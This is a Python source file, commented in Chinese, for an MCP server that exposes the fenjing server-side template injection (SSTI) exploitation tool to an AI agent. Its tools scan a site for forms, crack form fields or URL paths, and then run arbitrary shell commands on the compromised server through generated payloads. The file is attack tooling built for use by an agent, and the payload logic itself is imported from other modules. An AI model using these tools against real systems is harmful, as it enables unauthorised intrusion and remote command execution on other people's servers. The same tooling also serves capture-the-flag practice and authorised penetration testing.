#!/usr/bin/env python3
"""fenjing MCP服务器模块"""

import asyncio
import json
import uuid
from typing import Dict, Any, Optional
from dataclasses import dataclass
from mcp.server.fastmcp import FastMCP
# Tool import removed - not needed in current MCP version

from .cracker import Cracker
from .requester import HTTPRequester
from .submitter import PathSubmitter, FormSubmitter, Submitter
from .options import Options
from .form import get_form
from .full_payload_gen import FullPayloadGen
from .scan_url import yield_form
from urllib.parse import urlparse

# MCP服务器实例
mcp = FastMCP("fenjing")

# 会话管理
sessions: Dict[str, Dict[str, Any]] = {}


def create_session(full_payload_gen: FullPayloadGen, submitter: Submitter) -> str:
    """创建新的攻击会话"""
    session_id = str(uuid.uuid4())
    sessions[session_id] = {
        "full_payload_gen": full_payload_gen,
        "submitter": submitter,
        "created_at": asyncio.get_event_loop().time()
    }
    return session_id


def get_session(session_id: str) -> Optional[Dict[str, Any]]:
    """获取会话"""
    return sessions.get(session_id)


@mcp.tool()
async def crack(
    url: str,
    method: str,
    inputs: str,
    interval: float
) -> str:
    """
    执行SSTI攻击
    
    Args:
        url: 目标URL
        method: HTTP方法，GET或POST
        inputs: 输入参数，以逗号分隔
        interval: 请求间隔时间（秒）
    
    Returns:
        session_id: 攻击成功后的会话ID
    """
    # 创建表单
    form = get_form(
        action=urlparse(url).path,
        method=method,
        inputs=inputs.split(",") if inputs else []
    )
    
    # 创建请求器
    requester = HTTPRequester(
        interval=interval,
        user_agent="fenjing-mcp/1.0",
        headers={},
        extra_params_querystr=None,
        extra_data_querystr=None,
        proxy="",
        no_verify_ssl=False
    )
    
    # 默认选项
    options = Options()
    
    # 遍历所有输入字段尝试攻击
    for input_field in form["inputs"]:
        submitter = FormSubmitter(
            url,
            form,
            input_field,
            requester,
        )
        
        cracker = Cracker(
            submitter=submitter,
            options=options,
        )
        
        if not cracker.has_respond():
            continue
        
        full_payload_gen = cracker.crack()
        if full_payload_gen:
            session_id = create_session(full_payload_gen, submitter)
            return json.dumps({
                "session_id": session_id,
                "message": "攻击成功，已创建会话",
                "target": url,
                "method": method,
                "inputs": inputs
            }, ensure_ascii=False)
    
    return json.dumps({
        "error": "攻击失败，未找到可用的输入字段"
    }, ensure_ascii=False)


@mcp.tool()
async def crack_path(
    url: str,
    interval: float
) -> str:
    """
    执行路径型SSTI攻击
    
    Args:
        url: 目标URL
        interval: 请求间隔时间（秒）
    
    Returns:
        session_id: 攻击成功后的会话ID
    """
    # 创建请求器
    requester = HTTPRequester(
        interval=interval,
        user_agent="fenjing-mcp/1.0",
        headers={},
        extra_params_querystr=None,
        extra_data_querystr=None,
        proxy="",
        no_verify_ssl=False
    )
    
    # 默认选项
    options = Options()
    
    submitter = PathSubmitter(url=url, requester=requester)
    
    cracker = Cracker(
        submitter=submitter,
        options=options,
    )
    
    if not cracker.has_respond():
        return json.dumps({
            "error": "目标无响应"
        }, ensure_ascii=False)
    
    full_payload_gen = cracker.crack()
    if full_payload_gen:
        session_id = create_session(full_payload_gen, submitter)
        return json.dumps({
            "session_id": session_id,
            "message": "路径攻击成功，已创建会话",
            "target": url
        }, ensure_ascii=False)
    
    return json.dumps({
        "error": "路径攻击失败"
    }, ensure_ascii=False)


@mcp.tool()
async def session_execute_command(
    session_id: str,
    command: str
) -> str:
    """
    在攻击会话中执行命令
    
    Args:
        session_id: 会话ID
        command: 要执行的shell命令
    
    Returns:
        命令执行结果
    """
    session = get_session(session_id)
    if not session:
        return json.dumps({
            "error": "会话不存在或已过期"
        }, ensure_ascii=False)
    
    full_payload_gen = session["full_payload_gen"]
    submitter = session["submitter"]
    
    # 执行命令
    from .full_payload_gen import FullPayloadGen
    if isinstance(full_payload_gen, FullPayloadGen):
        payload, will_print = full_payload_gen.generate("os_popen_read", command)
        if payload:
            result = submitter.submit(payload)
            if will_print:
                return json.dumps({
                    "success": True,
                    "result": result,
                    "session_id": session_id
                }, ensure_ascii=False)
            else:
                return json.dumps({
                    "success": True,
                    "message": "命令已提交，但无返回内容（可能为后台执行）",
                    "session_id": session_id
                }, ensure_ascii=False)
        else:
            return json.dumps({
                "error": "生成payload失败"
            }, ensure_ascii=False)
    else:
        return json.dumps({
            "error": "不支持的payload生成器类型"
        }, ensure_ascii=False)


@mcp.tool()
async def session_generate_payload(
    session_id: str,
    command: str
) -> str:
    """
    为shell命令生成payload
    
    Args:
        session_id: 会话ID
        command: 要执行的shell命令
    
    Returns:
        生成的payload
    """
    session = get_session(session_id)
    if not session:
        return json.dumps({
            "error": "会话不存在或已过期"
        }, ensure_ascii=False)
    
    full_payload_gen = session["full_payload_gen"]
    
    # 生成payload
    payload, will_print = full_payload_gen.generate("os_popen_read", command)
    
    if payload is None:
        return json.dumps({
            "error": "生成payload失败"
        }, ensure_ascii=False)
    
    return json.dumps({
        "payload": payload,
        "will_print": will_print,
        "session_id": session_id
    }, ensure_ascii=False)


@mcp.tool()
async def scan(
    url: str,
    interval: float
) -> str:
    """
    扫描目标URL并返回所有发现的表单
    
    Args:
        url: 目标URL
        interval: 请求间隔时间（秒）
    
    Returns:
        扫描结果，包含所有发现的URL和表单
    """
    # 创建请求器
    requester = HTTPRequester(
        interval=interval,
        user_agent="fenjing-mcp/1.0",
        headers={},
        extra_params_querystr=None,
        extra_data_querystr=None,
        proxy="",
        no_verify_ssl=False
    )

    # 扫描表单
    results = []
    for target_url, forms in yield_form(requester, url):
        form_list = []
        for form in forms:
            form_list.append({
                "action": form.get("action"),
                "method": form.get("method"),
                "inputs": form.get("inputs")
            })
        results.append({
            "url": target_url,
            "forms": form_list
        })

    return json.dumps({
        "success": True,
        "results": results,
        "target": url
    }, ensure_ascii=False)

def main():
    """启动MCP服务器"""
    import sys
    import os
    
    # 确保日志目录存在
    log_dir = '/tmp/fenjing'
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, 'mcp-server.log')
    
    # 直接写入日志文件，不使用logging库
    try:
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f'=== fenjing MCP服务器启动 ===\n')
            f.write(f'时间: {__import__("datetime").datetime.now()}\n')
            f.write(f'PID: {os.getpid()}\n')
            f.write(f'命令行: {sys.argv}\n')
            f.flush()
    except Exception as e:
        # 如果无法写入日志，忽略错误继续运行
        # 不输出到stderr以避免干扰stdio
        pass
    
    # 运行MCP服务器
    mcp.run(transport="stdio")
